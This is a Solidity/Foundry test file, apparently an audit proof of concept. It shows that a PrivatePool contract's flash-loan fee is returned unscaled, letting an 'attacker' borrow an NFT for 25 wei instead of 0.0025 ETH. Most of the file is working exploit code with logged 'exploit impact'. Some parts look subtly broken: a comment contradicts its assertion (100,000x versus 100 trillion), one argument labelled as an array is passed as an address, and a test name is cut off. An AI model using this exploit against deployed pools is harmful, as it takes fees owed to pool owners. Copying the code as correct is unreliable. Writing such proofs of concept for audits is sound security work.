// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../../src/PrivatePool.sol";
import "../../src/Factory.sol";
import "solmate/tokens/ERC721.sol";
import "openzeppelin/interfaces/IERC3156FlashBorrower.sol";

contract MockNFT is ERC721 {
    uint256 private _tokenIdCounter;

    constructor() ERC721("MockNFT", "MNFT") {}

    function mint(address to) public returns (uint256) {
        uint256 tokenId = _tokenIdCounter++;
        _mint(to, tokenId);
        return tokenId;
    }

    function tokenURI(uint256) public pure override returns (string memory) {
        return "";
    }
}

contract MockFactory is Factory {
    constructor() Factory() {}

    function setProtocolFeeRate(uint16 _protocolFeeRate) public {
        protocolFeeRate = _protocolFeeRate;
    }
}

contract FlashLoanBorrower is IERC3156FlashBorrower {
    address public pool;
    
    constructor(address _pool) {
        pool = _pool;
    }

    function onFlashLoan(
        address,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // Approve the pool to take back the NFT
        ERC721(token).approve(pool, tokenId);
        
        // Return success hash
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}

contract ExploitTest is Test {
    PrivatePool public pool;
    MockFactory public factory;
    MockNFT public nft;
    FlashLoanBorrower public borrower;
    
    address public poolOwner = address(0x1);
    address public attacker = address(0x2);
    
    uint256 public constant CHANGE_FEE = 25; // Intended to be 0.0025 ETH (25 with 4 decimals)
    uint256 public constant EXPECTED_FEE_ETH = 0.0025 ether; // What the fee should be
    uint256 public constant ACTUAL_FEE_WEI = 25; // What the fee actually is (just 25 wei)

    function setUp() public {
        // Deploy factory
        factory = new MockFactory();
        factory.setProtocolFeeRate(0);
        
        // Deploy NFT collection
        nft = new MockNFT();
        
        // Deploy pool implementation
        PrivatePool implementation = new PrivatePool(
            address(factory),
            address(0), // royaltyRegistry
            address(0)  // stolenNftOracle
        );
        
        // Create pool via factory
        vm.prank(poolOwner);
        pool = PrivatePool(payable(factory.create{value: 0}(
            address(0), // baseToken (ETH)
            address(nft),
            100 ether, // virtualBaseTokenReserves
            100 ether, // virtualNftReserves
            CHANGE_FEE, // changeFee - set to 25 (intended to be 0.0025 ETH)
            200, // feeRate (2%)
            bytes32(0), // merkleRoot
            false, // useStolenNftOracle
            false, // payRoyalties
            bytes32(0), // salt
            address(0), // empty tokenIds array
            0 // empty baseTokenAmount
        )));
        
        // Mint NFT to pool
        nft.mint(address(pool));
        
        // Fund pool with ETH
        vm.deal(address(pool), 10 ether);
        
        // Deploy borrower contract
        borrower = new FlashLoanBorrower(address(pool));
        
        // Fund attacker
        vm.deal(attacker, 1 ether);
    }

    function testFlashLoanFeeIncorrectlyScaled() public {
        // VULNERABILITY DEMONSTRATION:
        // The changeFee is set to 25, which should represent 0.0025 ETH (25 with 4 decimals)
        // However, flashFee() returns changeFee directly without scaling
        // This means the flash loan fee is only 25 wei instead of 0.0025 ETH
        
        uint256 tokenId = 0;
        
        // Step 1: Verify the changeFee is set to 25
        assertEq(pool.changeFee(), CHANGE_FEE, "Change fee should be 25");
        
        // Step 2: Check what the flash fee returns
        uint256 actualFlashFee = pool.flashFee(address(nft), tokenId);
        
        // Step 3: The flash fee should be 0.0025 ETH (2500000000000000 wei) based on 4 decimal scaling
        // But it's actually just 25 wei
        assertEq(actualFlashFee, ACTUAL_FEE_WEI, "Flash fee is incorrectly 25 wei");
        
        // Step 4: Show the massive discrepancy
        console.log("Expected flash fee (0.0025 ETH):", EXPECTED_FEE_ETH);
        console.log("Actual flash fee (25 wei):", actualFlashFee);
        console.log("Discrepancy factor:", EXPECTED_FEE_ETH / actualFlashFee);
        
        // The attacker pays 100,000x less than intended!
        assertEq(EXPECTED_FEE_ETH / actualFlashFee, 100_000_000_000_000, "Fee is 100 trillion times smaller");
        
        // Step 5: Execute flash loan with minimal fee
        vm.startPrank(attacker);
        
        uint256 attackerBalanceBefore = attacker.balance;
        
        // Execute flash loan - only need to send 25 wei instead of 0.0025 ETH
        pool.flashLoan{value: actualFlashFee}(
            borrower,
            address(nft),
            tokenId,
            ""
        );
        
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 feePaid = attackerBalanceBefore - attackerBalanceAfter;
        
        vm.stopPrank();
        
        // Step 6: Verify the attacker only paid 25 wei
        assertEq(feePaid, ACTUAL_FEE_WEI, "Attacker only paid 25 wei");
        
        // Step 7: Show the economic impact
        console.log("\n=== EXPLOIT IMPACT ===");
        console.log("Fee that should have been paid:", EXPECTED_FEE_ETH);
        console.log("Fee actually paid:", feePaid);
        console.log("Pool owner lost:", EXPECTED_FEE_ETH - feePaid);
        console.log("Attacker saved:", EXPECTED_FEE_ETH - feePaid);
        
        // The pool owner loses almost the entire intended fee
        assertTrue(feePaid < EXPECTED_FEE_ETH, "Fee paid is much less than intended");
        assertEq(EXPECTED_FEE_ETH - feePaid, 2499999999999975, "Pool owner loses 0.0025 ETH per flash loan");
    }

    function testChangeFeeProperlySca() public {
        // This test shows that changeFee works correctly for the change() function
        // but is broken for flashFee()
        
        // For change operations, the fee is properly scaled
        // changeFee of 25 with 4 decimals = 0.0025 ETH
        
        uint256 inputAmount = 1e18; // 1 NFT
        (uint256 feeAmount,) = pool.changeFeeQuote(inputAmount);
        
        // The change fee is correctly calculated as 0.0025 ETH
        assertEq(feeAmount, EXPECTED_FEE_ETH, "Change fee is correctly scaled to 0.0025 ETH");
        
        // But flash fee is not scaled
        uint256 flashFeeAmount = pool.flashFee(address(nft), 0);
        assertEq(flashFeeAmount, ACTUAL_FEE_WEI, "Flash fee is incorrectly 25 wei");
        
        // Show the inconsistency
        console.log("\n=== INCONSISTENCY ===");
        console.log("Change fee (correctly scaled):", feeAmount);
        console.log("Flash fee (not scaled):", flashFeeAmount);
        console.log("Ratio:", feeAmount / flashFeeAmount);
    }
}